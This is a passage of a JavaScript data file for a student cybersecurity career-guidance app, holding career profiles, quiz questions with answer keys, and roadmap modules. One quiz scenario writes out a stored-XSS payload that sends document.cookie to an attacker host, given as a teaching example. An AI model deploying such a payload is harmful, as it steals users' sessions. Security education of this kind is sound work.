/**
 * ===================================================================
 * CyberCareer AI – AI Cybersecurity Career Copilot
 * College Cybersecurity Capstone Project
 * Complete Application Logic, Data Models & LocalStorage Coordinator
 * ===================================================================
 */

'use strict';

// -------------------------------------------------------------------
// 1. Core Data Models (Careers, Assessment, Roadmap, Projects, Questions)
// -------------------------------------------------------------------

const CAREERS_DATA = [
  {
    id: 'soc',
    title: 'SOC Analyst',
    category: 'defensive',
    categoryLabel: 'Defensive Operations',
    shortDesc: 'Monitors enterprise networks for security events, investigates SIEM alerts, conducts initial threat triage, and handles endpoint containment.',
    skills: ['Splunk / Wazuh', 'Wireshark', 'TCP/IP', 'Linux / Bash', 'Sysmon', 'Incident Triage'],
    certifications: ['CompTIA Security+', 'CompTIA CySA+', 'Blue Team Level 1 (BTL1)', 'Cisco CBROPS'],
    responsibilities: [
      'Monitor and triage Tier-1 security events in SIEM platforms (Splunk, Elastic, Sentinel).',
      'Correlate disparate log sources including firewall, VPN, DNS, and endpoint logs.',
      'Investigate suspected phishing emails, malware outbreaks, and unauthorized access attempts.',
      'Isolate compromised endpoints and escalate severe incidents to Tier-2 / Incident Response.'
    ],
    resources: [
      { name: 'TryHackMe SOC Level 1 Path', url: 'https://tryhackme.com' },
      { name: "Let'sDefend SOC Blue Team Labs", url: 'https://letsdefend.io' },
      { name: 'Splunk Free Fundamentals Training', url: 'https://splunk.com' }
    ],
    dayInLife: 'Your shift begins with a briefing on active threat actor campaigns. You review high-priority SIEM alerts, analyze an unusual outbound PowerShell connection flag, inspect memory strings in Sysmon, confirm malware beaconing, isolate the affected laptop from the corporate VLAN, and open a remediation ticket.',
    tools: ['Splunk', 'Wireshark', 'Wazuh', 'VirusTotal', 'Sysinternals', 'Velociraptor'],
    salaryBenchmark: 'Typical Entry Level: $65,000 - $85,000 (Industry benchmark estimate; varies by region & clearance)'
  },
  {
    id: 'pentest',
    title: 'Penetration Tester',
    category: 'offensive',
    categoryLabel: 'Offensive Security',
    shortDesc: 'Executes authorized simulated cyberattacks against corporate networks, servers, and applications to uncover vulnerabilities before malicious actors do.',
    skills: ['Nmap', 'Metasploit', 'Burp Suite', 'Python / Bash', 'Active Directory', 'Exploit Analysis'],
    certifications: ['CompTIA PenTest+', 'eJPT (eLearnSecurity)', 'OSCP (OffSec Certified Professional)', 'CRTO'],
    responsibilities: [
      'Perform authorized external and internal network penetration assessments.',
      'Enumerate network services, identify misconfigurations, and demonstrate exploit impact.',
      'Test web applications for OWASP Top 10 vulnerabilities (SQLi, XSS, IDOR, SSRF).',
      'Author comprehensive technical debrief reports detailing executive risk and technical remediations.'
    ],
    resources: [
      { name: 'Hack The Box Academy', url: 'https://hackthebox.com' },
      { name: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security' },
      { name: 'TCM Security Practical Ethical Hacking', url: 'https://tcm-sec.com' }
    ],
    dayInLife: 'You start with scoping meeting review for a healthcare client. You perform stealthy network recon using Nmap, discover an unpatched SMB service on an internal server, demonstrate privilege escalation to domain admin, capture proof-of-concept screenshots, and write clear remediation steps.',
    tools: ['Kali Linux', 'Burp Suite Pro', 'Nmap', 'Metasploit', 'BloodHound', 'CrackMapExec'],
    salaryBenchmark: 'Typical Entry Level: $75,000 - $95,000 (Industry benchmark estimate; varies by certifications)'
  },
  {
    id: 'sec-analyst',
    title: 'Security Analyst',
    category: 'defensive',
    categoryLabel: 'GRC & Operations',
    shortDesc: 'Assesses security risks, administers vulnerability management platforms, enforces security policies, and aligns operations with NIST and ISO frameworks.',
    skills: ['Vulnerability Scanning', 'NIST CSF', 'Risk Assessment', 'Access Control', 'Policy Auditing', 'Excel / BI'],
    certifications: ['CompTIA Security+', 'CRISC (ISACA)', 'CISA', 'ISO 27001 Lead Auditor'],
    responsibilities: [
      'Conduct recurring vulnerability scans using Tenable Nessus or Qualys, assigning remediation priorities.',
      'Evaluate third-party vendor risk assessments and software supply-chain security.',
      'Audit access control lists (ACLs) and enforce enterprise principle of least privilege.',
      'Coordinate with system owners to ensure compliance with NIST SP 800-53 or ISO/IEC 27001 standards.'
    ],
    resources: [
      { name: 'NIST Computer Security Resource Center', url: 'https://csrc.nist.gov' },
      { name: 'CISA Free Cybersecurity Toolkits', url: 'https://cisa.gov' },
      { name: 'Cybrary GRC & Risk Assessment Track', url: 'https://cybrary.it' }
    ],
    dayInLife: 'You review weekly vulnerability scan outputs for 400 cloud servers. You filter false positives, coordinate with the DevOps team to patch a zero-day vulnerability in Apache, review compliance status against NIST CSF categories, and deliver an executive risk report to the CISO.',
    tools: ['Tenable Nessus', 'Qualys', 'ServiceNow GRC', 'Microsoft Defender for Cloud', 'Excel'],
    salaryBenchmark: 'Typical Entry Level: $70,000 - $88,000 (Industry benchmark estimate)'
  },
  {
    id: 'incident-responder',
    title: 'Incident Responder',
    category: 'defensive',
    categoryLabel: 'DFIR & Triage',
    shortDesc: 'Investigates confirmed cybersecurity breaches, traces adversary footholds, isolates compromised assets, and drives enterprise recovery efforts.',
    skills: ['Memory Forensics', 'KAPE / Triage', 'Windows Event Logs', 'YARA Rules', 'MITRE ATT&CK', 'EDR Querying'],
    certifications: ['GIAC Certified Incident Handler (GCIH)', 'CompTIA CySA+', 'Blue Team Level 2 (BTL2)', 'EC-Council ECIH'],
    responsibilities: [
      'Execute emergency incident response playbooks for ransomware, business email compromise, and APTs.',
      'Acquire live volatile memory dumps and disk images following strict chain of custody.',
      'Reconstruct attacker attack timelines using MITRE ATT&CK tactics, techniques, and procedures (TTPs).',
      'Author post-incident reports and present lessons learned to senior leadership.'
    ],
    resources: [
      { name: 'SANS Digital Forensics Posters', url: 'https://sans.org' },
      { name: '13Cubed DFIR YouTube & Cheat Sheets', url: 'https://13cubed.com' },
      { name: 'Cyber5W Practical Incident Handling', url: 'https://cyber5w.com' }
    ],
    dayInLife: 'Page alerts you at 7 AM: an active ransomware precursor has been detected on a domain controller. You immediately execute host isolation via CrowdStrike, grab a volatile RAM dump with winpmem, parse the MFT and event logs with KAPE, identify the initial spearphishing entry vector, and neutralize the command-and-control connection.',
    tools: ['CrowdStrike Falcon', 'Volatility 3', 'KAPE', 'FTK Imager', 'YARA', 'Wireshark'],
    salaryBenchmark: 'Typical Entry Level: $80,000 - $105,000 (Industry benchmark estimate)'
  },
  {
    id: 'forensics',
    title: 'Digital Forensics Analyst',
    category: 'forensics',
    categoryLabel: 'Digital Forensics',
    shortDesc: 'Recovers, preserves, and analyzes digital evidence from seized drives and memory to assist in corporate investigations, legal cases, and breach forensics.',
    skills: ['Autopsy / SleuthKit', 'Disk Imaging', 'File Carving', 'Ghidra', 'Registry Analysis', 'Evidence Custody'],
    certifications: ['GIAC Forensic Analyst (GCFA)', 'EnCE', 'Certified Forensic Computer Examiner (CFCE)', 'CHFI'],
    responsibilities: [
      'Create bit-stream forensic images (E01/DD) without altering the original media source.',
      'Analyze Windows registry hives, prefetch files, LNK shortcuts, and browser history for evidence.',
      'Carve deleted files from unallocated disk space and verify hash integrity (MD5/SHA-256).',
      'Maintain verifiable legal chain of custody and prepare formal evidentiary documentation.'
    ],
    resources: [
      { name: 'Open Source DFIR Autopsy Training', url: 'https://autopsy.com' },
      { name: 'Forensic Focus Community', url: 'https://forensicfocus.com' },
      { name: 'DFIR Diva Beginner Resource Hub', url: 'https://dfirdiva.com' }
    ],
    dayInLife: 'You receive an encrypted laptop involved in an insider data theft allegation. You verify hardware write-blockers, generate a forensic image verified against SHA-256 hashes, parse USB connection registry keys showing a thumb drive inserted at 4:52 PM, recover deleted sensitive spreadsheets, and write the forensic affidavit.',
    tools: ['Autopsy', 'FTK Imager', 'X-Ways Forensics', 'Ghidra', 'Arsenal Image Mounter', 'RECmd'],
    salaryBenchmark: 'Typical Entry Level: $72,000 - $92,000 (Industry benchmark estimate)'
  },
  {
    id: 'cloud-sec',
    title: 'Cloud Security Engineer',
    category: 'cloud-infra',
    categoryLabel: 'Cloud Architecture',
    shortDesc: 'Secures public cloud infrastructure across AWS, Azure, or GCP by engineering least-privilege IAM policies, network security groups, and automated guardrails.',
    skills: ['AWS / Azure Security', 'IAM Architecture', 'Terraform / IaC', 'Kubernetes / Docker', 'CloudTrail / GuardDuty', 'CSPM'],
    certifications: ['AWS Certified Security – Specialty', 'Microsoft Azure Security (AZ-500)', 'CCSP (ISC2)', 'HashiCorp Terraform'],
    responsibilities: [
      'Implement and audit Identity & Access Management (IAM) policies with zero wildcard trust.',
      'Architect secure VPC peering, private subnets, security groups, and transit gateways.',
      'Embed security policy validation (checkov, tfsec) into CI/CD infrastructure-as-code pipelines.',
      'Configure automated threat detection and compliance guardrails using AWS GuardDuty and Security Hub.'
    ],
    resources: [
      { name: 'AWS Skill Builder Free Security Learning Plan', url: 'https://aws.amazon.com' },
      { name: 'Microsoft Learn Azure Security Engineer Track', url: 'https://learn.microsoft.com' },
      { name: 'Flaws.cloud Hands-On AWS Security Labs', url: 'http://flaws.cloud' }
    ],
    dayInLife: 'You examine an alert from AWS Security Hub indicating an S3 bucket has been modified to permit public read access. You run an automated Terraform pipeline remediation, enforce bucket policies restricting public ACLs organization-wide, and configure an IAM permission boundary to prevent junior engineers from generating wildcard admin credentials.',
    tools: ['AWS Console / CLI', 'Terraform', 'Checkov', 'Prisma Cloud', 'Docker', 'Kubernetes'],
    salaryBenchmark: 'Typical Entry Level: $85,000 - $115,000 (Industry benchmark estimate)'
  },
  {
    id: 'app-sec',
    title: 'Application Security Engineer',
    category: 'offensive',
    categoryLabel: 'AppSec & DevSecOps',
    shortDesc: 'Partners with software development teams to embed security into the SDLC through code reviews, threat modeling, SAST/DAST tooling, and API defense.',
    skills: ['OWASP Top 10', 'SAST / DAST (Snyk, Semgrep)', 'Code Auditing (Python, JS)', 'Burp Suite Pro', 'API Security', 'CI/CD Pipelines'],
    certifications: ['Burp Suite Certified Practitioner (BSCP)', 'Certified AppSec Practitioner (CAP)', 'GIAC Web App Defender (GWEB)'],
    responsibilities: [
      'Conduct architectural threat modeling on upcoming web applications and microservices.',
      'Integrate Static (SAST) and Dynamic (DAST) analysis tools into GitHub Actions pipelines.',
      'Audit source code for injection vulnerabilities, broken authentication, and insecure deserialization.',
      'Educate development teams on secure coding guidelines and remediating identified security bugs.'
    ],
    resources: [
      { name: 'PortSwigger Web Security Academy', url: 'https://portswigger.net' },
      { name: 'OWASP Application Security Verification Standard', url: 'https://owasp.org' },
      { name: 'Kontra Interactive Application Security Tutorials', url: 'https://application.security' }
    ],
    dayInLife: 'You review a pull request containing a new user payment checkout API. Using Semgrep, you catch an unparameterized database query susceptible to SQL injection. You pair with the developer to rewrite the query using an ORM prepared statement, test the endpoint with Burp Suite, and verify passing automated unit security tests.',
    tools: ['Burp Suite', 'Semgrep', 'Snyk', 'OWASP ZAP', 'Postman', 'GitHub Advanced Security'],
    salaryBenchmark: 'Typical Entry Level: $85,000 - $110,000 (Industry benchmark estimate)'
  },
  {
    id: 'consultant',
    title: 'Cybersecurity Consultant',
    category: 'consulting',
    categoryLabel: 'Advisory & Strategy',
    shortDesc: 'Evaluates enterprise cybersecurity posture, reviews technical architectures, assesses business risk, and delivers strategic defense roadmaps for executive clients.',
    skills: ['Cyber Risk Assessment', 'CIS Controls', 'Technical Writing', 'Client Advisory', 'Audit & Compliance', 'Scoping & Threat Modeling'],
    certifications: ['CompTIA Security+', 'CISSP (Associate of ISC2)', 'CISM', 'CompTIA CASP+'],
    responsibilities: [
      'Assess client cyber maturity against frameworks like NIST CSF, ISO 27001, and CIS Critical Security Controls.',
      'Facilitate tabletop simulation exercises with executive teams testing incident response readiness.',
      'Review network diagrams and cloud architectures to identify single points of failure.',
      'Deliver executive presentations and actionable roadmaps that bridge technical risk to business impact.'
    ],
    resources: [
      { name: 'Center for Internet Security (CIS) Controls Hub', url: 'https://cisecurity.org' },
      { name: 'SANS Cyber Leadership Guides', url: 'https://sans.org' },
      { name: 'AICPA SOC 2 Compliance Framework Guidelines', url: 'https://aicpa.org' }
    ],
    dayInLife: 'You lead a cybersecurity maturity workshop for a regional manufacturing client. You evaluate their ransomware resilience, interview their IT director about backup immutability, discover lack of MFA on legacy VPN endpoints, and craft a 12-month strategic remediation roadmap presented directly to their Board of Directors.',
    tools: ['CIS CSAT Tool', 'Microsoft Visio / Lucidchart', 'ServiceNow', 'Excel Risk Matrices', 'Keynote / PowerPoint'],
    salaryBenchmark: 'Typical Entry Level: $75,000 - $95,000 (Industry benchmark estimate)'
  }
];

const ASSESSMENT_QUESTIONS = [
  // --- Pillar 1: Networking ---
  {
    id: 1,
    domain: 'networking',
    domainLabel: 'Computer Networking',
    text: 'During a TCP connection establishment, what is the exact packet handshake sequence exchanged between a client and server before data transfer begins?',
    scenario: 'A network administrator is analyzing Wireshark packet captures of an attempted telnet session and needs to confirm whether a standard connection handshake occurred successfully.',
    choices: [
      'ACK -> SYN -> SYN-ACK',
      'SYN -> SYN-ACK -> ACK',
      'SYN -> ACK -> DATA',
      'FIN -> ACK -> RST'
    ],
    correctIndex: 1,
    explanation: 'The standard TCP 3-way handshake begins with the client sending a SYN (Synchronize), the server responding with SYN-ACK (Synchronize-Acknowledge), and the client completing connection with an ACK (Acknowledge).'
  },
  {
    id: 2,
    domain: 'networking',
    domainLabel: 'Computer Networking',
    text: 'Which transport protocol and default destination port does a standard, non-encrypted DNS name resolution query utilize?',
    scenario: 'You are configuring a stateful egress firewall rule to allow internal hosts to resolve domain names through an authorized internal DNS server.',
    choices: [
      'TCP port 80',
      'UDP port 53',
      'TCP port 443',
      'UDP port 67'
    ],
    correctIndex: 1,
    explanation: 'Standard DNS queries use UDP port 53 for fast, lightweight name lookups. TCP port 53 is typically reserved for DNS zone transfers or queries exceeding 512 bytes.'
  },
  {
    id: 3,
    domain: 'networking',
    domainLabel: 'Computer Networking',
    text: 'Given the IPv4 address block 192.168.10.0/26, how many usable host IP addresses are available within this single subnet?',
    scenario: 'You are segmenting a corporate security lab into smaller broadcast domains to isolate vulnerable practice virtual machines.',
    choices: [
      '62 usable hosts',
      '64 usable hosts',
      '30 usable hosts',
      '126 usable hosts'
    ],
    correctIndex: 0,
    explanation: 'A /26 subnet has 6 host bits (32 - 26 = 6). Total addresses = 2^6 = 64. Subtracting 2 (one network ID and one broadcast address) yields exactly 62 usable host addresses.'
  },

  // --- Pillar 2: Linux & Command-Line ---
  {
    id: 4,
    domain: 'linux',
    domainLabel: 'Linux Fundamentals',
    text: 'What do the numeric file permissions 750 represent in standard Linux octal permissions for Owner, Group, and Others?',
    scenario: 'A security engineer is hardening a directory containing sensitive audit scripts (/opt/sec/audit) on an Ubuntu server.',
    choices: [
      'Owner: Read/Write; Group: Read/Execute; Others: Read',
      'Owner: Read/Write/Execute (rwx); Group: Read/Execute (r-x); Others: No permissions (---)',
      'Owner: Read/Write (rw-); Group: Write/Execute (-wx); Others: Read/Execute (r-x)',
      'Owner: Execute; Group: Write; Others: Read'
    ],
    correctIndex: 1,
    explanation: '7 = 4+2+1 (rwx for owner). 5 = 4+0+1 (r-x for group). 0 = 0 (no access for others). This is a foundational least-privilege permission setting in Linux.'
  },
  {
    id: 5,
    domain: 'linux',
    domainLabel: 'Linux Fundamentals',
    text: 'Which command correctly searches for the keyword "Failed password" inside the standard authentication log file on a Debian/Ubuntu system?',
    scenario: 'You are investigating potential SSH brute-force attempts targeting a public-facing cloud bastion host.',
    choices: [
      'find "Failed password" /var/log/syslog',
      'grep -i "Failed password" /var/log/auth.log',
      'cat /var/log/dmesg | filter "Failed password"',
      'tail -n 10 /etc/passwd'
    ],
    correctIndex: 1,
    explanation: 'On Debian/Ubuntu distributions, authentication and authorization events are logged to /var/log/auth.log (on RHEL/CentOS it is /var/log/secure). Grep is the standard utility for pattern searching.'
  },
  {
    id: 6,
    domain: 'linux',
    domainLabel: 'Linux Fundamentals',
    text: 'Which command displays running processes along with their current open network sockets and listening ports in Linux?',
    scenario: 'A SOC analyst suspects an unauthorized reverse shell is currently running on a Linux web server.',
    choices: [
      'sudo ss -tulpn (or sudo netstat -tulpn)',
      'ls -la /var/run',
      'chmod +x /bin/bash',
      'systemctl restart network'
    ],
    correctIndex: 0,
    explanation: '`ss -tulpn` shows TCP (-t), UDP (-u), listening (-l), processes (-p), and numeric ports (-n). It quickly reveals which process PID is holding a network socket open.'
  },

  // --- Pillar 3: Python for Security ---
  {
    id: 7,
    domain: 'python',
    domainLabel: 'Python for Security',
    text: 'In Python, which standard library module is used to establish raw TCP network sockets to check whether a specific port on a target host is open?',
    scenario: 'You are authoring a lightweight automated script to verify whether external port 22 or 443 is responding across 10 lab virtual machines.',
    choices: [
      'import socket',
      'import os_network',
      'import http_parser',
      'import sys_port'
    ],
    correctIndex: 0,
    explanation: 'Python’s built-in `socket` module provides low-level network interface functions, allowing developers to create TCP/UDP stream sockets and perform connect() calls.'
  },
  {
    id: 8,
    domain: 'python',
    domainLabel: 'Python for Security',
    text: 'Which Python regular expression pattern correctly matches a standard IPv4 address format composed of four octets separated by periods?',
    scenario: 'A threat hunting script must parse thousands of unformatted firewall log entries and extract all source IP addresses for blacklisting.',
    choices: [
      '^\\w+@\\w+\\.\\w+$',
      '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}',
      '[A-Z]{4}\\-[0-9]{4}',
      'http://.*'
    ],
    correctIndex: 1,
    explanation: 'The regex \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3} matches 1 to 3 decimal digits separated by literal escaped periods, standard for IPv4 addresses.'
  },
  {
    id: 9,
    domain: 'python',
    domainLabel: 'Python for Security',
    text: 'When parsing untrusted JSON data received from a threat intelligence API in Python, what construct should wrap the deserialization to prevent script crashes?',
    scenario: 'Your security automation script queries an external URL and parses the payload with `json.loads(response.text)`.',
    choices: [
      'A `while True:` loop',
      'A `try ... except json.JSONDecodeError:` block',
      'An `eval()` statement',
      'A `class SecurityThread:` wrapper'
    ],
    correctIndex: 1,
    explanation: 'Robust Python scripting requires catching potential `json.JSONDecodeError` exceptions when parsing external API inputs to prevent unhandled fatal script termination.'
  },

  // --- Pillar 4: Cybersecurity Fundamentals ---
  {
    id: 10,
    domain: 'fundamentals',
    domainLabel: 'Security Fundamentals',
    text: 'A ransomware attack that encrypts healthcare patient records without modifying or destroying the files violates primarily which pillar of the CIA Triad?',
    scenario: 'A hospital hospital admissions system is locked by ransomware, preventing doctors from accessing medical history, though backups confirm no data was altered or leaked.',
    choices: [
      'Confidentiality',
      'Integrity',
      'Availability',
      'Non-repudiation'
    ],
    correctIndex: 2,
    explanation: 'Availability ensures that authorized parties have timely, reliable access to critical information and assets. Denying access to systems or data directly compromises Availability.'
  },
  {
    id: 11,
    domain: 'fundamentals',
    domainLabel: 'Security Fundamentals',
    text: 'What is the primary technical difference between hashing and encryption?',
    scenario: 'An engineer is deciding how user account passwords should be stored in a modern database backend.',
    choices: [
      'Encryption is one-way only; hashing can be reversed with a private key.',
      'Hashing is a one-way mathematical function; encryption is two-way and reversible with the correct decryption key.',
      'Hashing uses symmetric keys; encryption uses no keys whatsoever.',
      'Hashing is only used for images; encryption is only used for text.'
    ],
    correctIndex: 1,
    explanation: 'Hashing produces a fixed-size irreversible digest intended for integrity verification and password storage (with salt). Encryption transforms plaintext into ciphertext and is designed to be reversed using a cryptographic key.'
  },
  {
    id: 12,
    domain: 'fundamentals',
    domainLabel: 'Security Fundamentals',
    text: 'Which authentication configuration represents true Multi-Factor Authentication (MFA)?',
    scenario: 'A corporate security policy mandates MFA compliance for all staff accessing remote administrative VPN portals.',
    choices: [
      'Entering a password, followed immediately by entering a PIN code stored in your memory.',
      'Entering a password (something you know) and approving a push notification on a registered smartphone (something you have).',
      'Entering your username and an email address verification link sent to the same computer screen.',
      'Entering two different passwords created during account registration.'
    ],
    correctIndex: 1,
    explanation: 'True MFA requires at least two distinct authentication categories: something you know (password/PIN), something you have (hardware token/authenticator app), or something you are (biometrics).'
  },

  // --- Pillar 5: Web Application Security ---
  {
    id: 13,
    domain: 'web',
    domainLabel: 'Web App Security',
    text: 'What is the most effective primary defense mechanism to completely prevent SQL Injection (SQLi) vulnerabilities in web applications?',
    scenario: 'A development team is refactoring a customer database login portal that previously concatenated user input directly into SQL strings.',
    choices: [
      'Client-side JavaScript input length checking',
      'Using parameterized queries / prepared statements (or an ORM)',
      'Converting all database passwords to uppercase letters',
      'Deploying a commercial Web Application Firewall without changing any application code'
    ],
    correctIndex: 1,
    explanation: 'Parameterized queries (prepared statements) ensure the database engine treats user input strictly as data parameters rather than executable SQL code, neutralizing SQL injection at the root.'
  },
  {
    id: 14,
    domain: 'web',
    domainLabel: 'Web App Security',
    text: 'Which OWASP vulnerability occurs when an application includes untrusted user data in a web page without proper validation or contextual output encoding, executing malicious scripts in the victim’s browser?',
    scenario: 'An attacker posts a comment containing `<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>` which runs automatically for every user who views the forum.',
    choices: [
      'Cross-Site Scripting (Stored XSS)',
      'Server-Side Request Forgery (SSRF)',
      'Broken Object Level Authorization (BOLA)',
      'Insecure Deserialization'
    ],
    correctIndex: 0,
    explanation: 'Stored (Persistent) Cross-Site Scripting occurs when malicious JavaScript payload is permanently stored in the application database and subsequently delivered to victim browsers without sanitization.'
  },
  {
    id: 15,
    domain: 'web',
    domainLabel: 'Web App Security',
    text: 'Which HTTP response header directive informs the browser to prevent cookies from being sent along with cross-site requests, mitigating Cross-Site Request Forgery (CSRF)?',
    scenario: 'You are auditing session cookie security headers for an online banking transaction portal.',
    choices: [
      'Set-Cookie: SameSite=Strict (or Lax)',
      'Access-Control-Allow-Origin: *',
      'X-Frame-Options: ALLOWALL',
      'Server: Apache/2.4'
    ],
    correctIndex: 0,
    explanation: 'The `SameSite=Strict` or `SameSite=Lax` cookie attribute prevents the browser from attaching the session cookie to cross-site requests initiated by third-party origins, providing defense against CSRF attacks.'
  },

  // --- Pillar 6: Cloud Security ---
  {
    id: 16,
    domain: 'cloud',
    domainLabel: 'Cloud Security',
    text: 'Under the cloud Shared Responsibility Model for an Infrastructure as a Service (IaaS) virtual machine (e.g. AWS EC2), who is responsible for patching the guest operating system and configuring host firewall rules?',
    scenario: 'A company deploys an EC2 Ubuntu server. An unpatched kernel vulnerability is exploited six months later.',
    choices: [
      'The cloud provider (AWS / Azure) exclusively',
      'The customer organization',
      'The hardware manufacturer of the physical server',
      'ICANN'
    ],
    correctIndex: 1,
    explanation: 'Under the IaaS model, the cloud provider manages security OF the cloud (physical facilities, virtualization layer, hardware). The customer is responsible for security IN the cloud (guest OS patches, firewall configurations, IAM, and data).'
  },
  {
    id: 17,
    domain: 'cloud',
    domainLabel: 'Cloud Security',
    text: 'In cloud Identity & Access Management (IAM), what security principle is violated when an administrative policy grants `"Action": "*", "Resource": "*"` to a standard application service account?',
    scenario: 'A cloud security audit flags an IAM role used by an automated Lambda backup script with full wildcard administrator permissions.',
    choices: [
      'Principle of Least Privilege',
      'Defense in Depth',
      'Separation of Environments',
      'Zero Data Retention'
    ],
    correctIndex: 0,
    explanation: 'The Principle of Least Privilege dictates that users, programs, and processes should be granted only the minimal permissions necessary to complete their intended function, never wildcard administrative access.'
  },
  {
    id: 18,
    domain: 'cloud',
    domainLabel: 'Cloud Security',
    text: 'What core architectural concept asserts that organizations should not automatically trust anything inside or outside their perimeters, requiring strict verification for every access attempt?',
    scenario: 'An enterprise is moving away from traditional perimeter VPNs toward microsegmentation and identity-based device health policies.',
    choices: [
      'Zero Trust Architecture',
      'Air-Gapping',
      'Demilitarized Zone (DMZ)',
      'Security through Obscurity'
    ],
    correctIndex: 0,
    explanation: 'Zero Trust ("Never Trust, Always Verify") enforces continuous explicit validation of identity, context, device health, and least privilege access regardless of network location.'
  }
];

const ROADMAP_MODULES = [
  {
    id: 'm1',
    num: '01',
    title: 'Computer Networking Fundamentals',
    desc: 'Master the protocols, packet flows, and addressing schemes that underpin all cyber communications.',
    topics: [
      { id: 'm1_t1', title: 'OSI 7-Layer & TCP/IP 4-Layer Architecture', desc: 'Encapsulation, packet headers, and mapping protocols across layers.' },
      { id: 'm1_t2', title: 'IPv4 Addressing, Subnetting & CIDR Calculations', desc: 'Binary subnet masks, host ranges, broadcast IDs, and network segmentation.' },
      { id: 'm1_t3', title: 'Core Protocols: TCP, UDP, ICMP, DNS & DHCP', desc: '3-way handshakes, stateful flags, connectionless vs connection-oriented transport.' },
      { id: 'm1_t4', title: 'Routing, NAT & Stateful vs Stateless Firewalls', desc: 'Default gateways, private RFC 1918 addresses, and access control lists (ACLs).' },
      { id: 'm1_t5', title: 'Hands-On Wireshark Packet Analysis', desc: 'Capturing real traffic, following TCP streams, and inspecting raw packet frames.' }
    ],
    resources: [
      { name: 'Professor Messer Network+ Free Course', url: 'https://professormesser.com' },
      { name: 'Wireshark Official Documentation & Sample Captures', url: 'https://wireshark.org' }
    ]
  },
  {
    id: 'm2',
    num: '02',
    title: 'Linux & Command-Line Essentials',
    desc: 'The backbone OS of servers, security appliances, and offensive penetration tools.',
    topics: [
      { id: 'm2_t1', title: 'Linux Filesystem Hierarchy & Navigation', desc: '/etc, /var/log, /proc, /dev, and terminal manipulation commands.' },
      { id: 'm2_t2', title: 'User Management & Octal Permissions (chmod, chown, sudo)', desc: 'Managing UIDs, GIDs, SUID bits, and sudoers configuration files.' },
      { id: 'm2_t3', title: 'Process Monitoring & System Services (systemd, ps, top)', desc: 'Managing daemons, inspecting rogue processes, and service isolation.' },
      { id: 'm2_t4', title: 'Text Processing Pipelines (grep, sed, awk, cut)', desc: 'Filtering multi-gigabyte log outputs to extract indicators of compromise.' },
      { id: 'm2_t5', title: 'Bash Scripting for Security Automation', desc: 'Loops, variables, exit codes, and automated host baseline checks.' }
    ],
    resources: [
      { name: 'OverTheWire: Bandit Wargame (Beginner Linux)', url: 'https://overthewire.org' },
      { name: 'Linux Journey Interactive Guide', url: 'https://linuxjourney.com' }
    ]
  },
  {
    id: 'm3',
    num: '03',
    title: 'Python Programming for Security',
    desc: 'Write custom scripts for automation, API log parsing, port enumeration, and payload generation.',
    topics: [
      { id: 'm3_t1', title: 'Python Core Syntax, Data Structures & File I/O', desc: 'Lists, dictionaries, sets, string formatting, and reading audit files.' },
      { id: 'm3_t2', title: 'Network Socket Programming & Port Probing', desc: 'Building simple multi-threaded TCP banner grabbers and port checkers.' },
      { id: 'm3_t3', title: 'Parsing Security Logs with Regular Expressions (re)', desc: 'Extracting IP addresses, hashes, and email headers from unstructured text.' },
      { id: 'm3_t4', title: 'Consuming Threat Intelligence APIs (requests library)', desc: 'Querying VirusTotal, AbuseIPDB, and AlienVault OTX programmatically.' },
      { id: 'm3_t5', title: 'Packet Crafting and Sniffing with Scapy', desc: 'Forging custom ARP packets and dissecting network traffic programmatically.' }
    ],
    resources: [
      { name: 'Automate the Boring Stuff with Python', url: 'https://automatetheboringstuff.com' },
      { name: 'Violent Python & Black Hat Python Labs', url: 'https://github.com' }
    ]
  },
  {
    id: 'm4',
    num: '04',
    title: 'Cybersecurity Fundamentals & Architecture',
    desc: 'Foundational concepts of information security governance, defense-in-depth, and cryptography.',
    topics: [
      { id: 'm4_t1', title: 'CIA Triad, Parkerian Hexad & Threat Modeling', desc: 'STRIDE model, DREAD scoring, and mapping business risk to cyber assets.' },
      { id: 'm4_t2', title: 'Symmetric vs Asymmetric Cryptography & PKI', desc: 'AES, RSA, ECC, digital certificates, CAs, and TLS handshakes.' },
      { id: 'm4_t3', title: 'Hashing Algorithms & Password Security (Salting, Pepper)', desc: 'SHA-256, bcrypt, rainbow tables, and collision resistance.' },
      { id: 'm4_t4', title: 'Authentication, Authorization & Accounting (AAA / IAM)', desc: 'RBAC, ABAC, Kerberos, SAML, OAuth 2.0, and MFA mechanisms.' },
      { id: 'm4_t5', title: 'NIST Cybersecurity Framework (CSF) & ISO 27001', desc: 'Identify, Protect, Detect, Respond, Recover pillars.' }
    ],
    resources: [
      { name: 'NIST CSF 2.0 Official Documentation', url: 'https://nist.gov' },
      { name: 'Cybrary Free Security Fundamentals', url: 'https://cybrary.it' }
    ]
  },
  {
    id: 'm5',
    num: '05',
    title: 'Web Application Security & OWASP Top 10',
    desc: 'Identify, dissect, and remediate the most prevalent web application vulnerabilities.',
    topics: [
      { id: 'm5_t1', title: 'HTTP/HTTPS Protocol, Headers & Browser Sandboxing', desc: 'Request methods, response status codes, SOP, and CORS policies.' },
      { id: 'm5_t2', title: 'SQL Injection (SQLi) & Parameterized Queries', desc: 'In-band, error-based, blind SQLi, and defense via prepared statements.' },
      { id: 'm5_t3', title: 'Cross-Site Scripting (XSS: Stored, Reflected, DOM)', desc: 'Payload delivery, session hijacking, and contextual HTML encoding.' },
      { id: 'm5_t4', title: 'Broken Authentication, Session Fixation & CSRF Tokens', desc: 'Session lifecycle, JWT vulnerabilities, and anti-forgery tokens.' },
      { id: 'm5_t5', title: 'Hands-on Interception with Burp Suite Community', desc: 'Repeater, intruder, proxy setup, and browser debugging workflows.' }
    ],
    resources: [
      { name: 'PortSwigger Web Security Academy Labs', url: 'https://portswigger.net/web-security' },
      { name: 'OWASP Juice Shop Practice Application', url: 'https://owasp.org/www-project-juice-shop/' }
    ]
  },
  {
    id: 'm6',
    num: '06',
    title: 'Ethical Hacking in Authorized Labs',
    desc: 'Execute offensive methodologies strictly inside isolated, legal training environments.',
    topics: [
      { id: 'm6_t1', title: 'Active & Passive Reconnaissance (OSINT & Nmap)', desc: 'Shodan, WHOIS, DNS reconnaissance, and advanced Nmap scanning flags.' },
      { id: 'm6_t2', title: 'Vulnerability Assessment with OpenVAS / Nessus', desc: 'Interpreting CVSS v3.1 scores, vulnerability reports, and false positives.' },
      { id: 'm6_t3', title: 'Exploitation Concepts with the Metasploit Framework', desc: 'Auxiliary modules, payloads, listeners, and meterpreter sessions.' },
